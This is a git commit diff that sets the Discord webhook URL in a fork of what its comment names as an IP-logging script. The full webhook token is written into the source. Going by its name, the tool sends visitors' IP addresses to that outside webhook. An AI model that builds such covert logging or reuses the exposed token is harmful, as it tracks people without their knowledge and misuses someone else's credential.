0c94a037adf4c4560706c4c3d9f2aeeb2e14a3c6
Rayan511x55x <138740710+Rayan511x55x@users.noreply.github.com>
2024-08-17 19:25:44 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 // Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
 
-var webHookUrl = "YOUR_WEBHOOK_URL_HERE";
+var webHookUrl = "https://discord.com/api/webhooks/1274392307105403022/h6AMMDzqM83Nmu0qJlGAtiuZaOw5zoIFVLWD13FXKy11b2-ByxfBSCp4-4NzRUa8ilii";
 
 /*
     Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
